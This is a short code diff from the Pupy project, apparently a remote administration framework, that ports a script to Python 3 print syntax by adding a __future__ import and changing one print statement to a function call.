@@ -3,6 +3,7 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
+from __future__ import print_function
 import argparse
 import sys
 import os.path
@@ -819,7 +820,7 @@ def main():
     from traceback import print_exc
 
     def display(data):
-        print hint_to_text(data)
+        print(hint_to_text(data))
 
     Credentials.DEFAULT_ROLE = 'CLIENT'
 
